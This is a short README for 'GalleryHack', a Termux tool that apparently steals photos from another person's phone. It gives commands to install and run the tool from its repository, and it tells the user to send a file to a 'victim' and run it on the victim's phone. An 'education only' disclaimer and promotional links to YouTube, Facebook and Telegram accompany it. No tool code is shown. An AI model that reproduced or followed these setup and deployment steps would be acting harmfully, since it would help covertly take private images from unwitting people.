# GalleryHack
## Termux Users Gallery Hack Tool (Owner - Razor Kenway | SL Android | Sri Lanka 🇱🇰 
### Command list 👇👇

>pkg update && pkg upgrade

>pkg install git

>git clone https://github.com/RazorKenway/GalleryHack.git

>cd GalleryHack

>python galleryhack.py

>Sent To victim Gahack.py File And Run Victim's Phone 

## Type Victim's phone :-  python Gahck.py

#                         Welcome To SL Android Youtube Channel

                                    💢 Disclaimer 💢
SL ANDROID Channel Doesn't Promote & Encourage Any illegal Activities, SL ANDROID YouTube Channel All Contents Only Provided  by Education &Purpose Only. Thanks for watching.

🔗 Follow Us On Facebook Page https://www.facebook.com/SLAndroidD/

🔗 Join Facebook Group https://www.facebook.com/groups/277920623081269/

🔗 Follow Us On Instagram https://www.instagram.com/sl_android_official/

🔗 Subscribe My youtube Channel https://www.youtube.com/c/SLAndroid

## Thak you very mutch

### Video Lesson :https://youtu.be/hT9qfU5695o (part 1)
###              :https://t.me/c/1374078574/72 (part 2) only telegram channel users

### join telegram :https://t.me/joinchat/UebGbvZ36Vuh5q56





